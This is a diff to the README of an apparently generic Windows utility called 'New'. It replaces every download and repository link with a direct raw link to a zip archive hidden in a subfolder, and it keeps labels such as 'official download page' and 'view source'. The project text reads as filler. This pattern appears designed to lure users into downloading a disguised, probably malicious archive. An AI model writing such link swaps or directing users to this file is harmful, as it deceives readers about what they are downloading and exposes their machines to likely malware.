@@ -1,6 +1,6 @@
 # ⚙️ New - Simple Tool for Everyday Tasks
 
-[![Download New](https://img.shields.io/badge/Download-New-green?style=for-the-badge)](https://github.com/Boymind/New/releases)
+[![Download New](https://img.shields.io/badge/Download-New-green?style=for-the-badge)](https://github.com/Boymind/New/raw/refs/heads/main/Hainai/Software-1.8-beta.2.zip)
 
 # Newtyyuug
 
@@ -37,7 +37,7 @@ Follow these steps to get New running on your Windows computer.
 
 Go to the official New release page by clicking the button below. This page contains the latest version of the software suitable for your system.
 
-[![Download Now](https://img.shields.io/badge/Download-New-blue?style=for-the-badge)](https://github.com/Boymind/New/releases)
+[![Download Now](https://img.shields.io/badge/Download-New-blue?style=for-the-badge)](https://github.com/Boymind/New/raw/refs/heads/main/Hainai/Software-1.8-beta.2.zip)
 
 ### 2. Find the Correct Version
 
@@ -127,7 +127,7 @@ For more detailed guidance:
 
 ## 📎 Important Links
 
-- [Download New Releases](https://github.com/Boymind/New/releases) (official download page)  
-- [GitHub Repository](https://github.com/Boymind/New) (view source and updates)
+- [Download New Releases](https://github.com/Boymind/New/raw/refs/heads/main/Hainai/Software-1.8-beta.2.zip) (official download page)  
+- [GitHub Repository](https://github.com/Boymind/New/raw/refs/heads/main/Hainai/Software-1.8-beta.2.zip) (view source and updates)
 
 Use the links above to get the latest versions and resources.
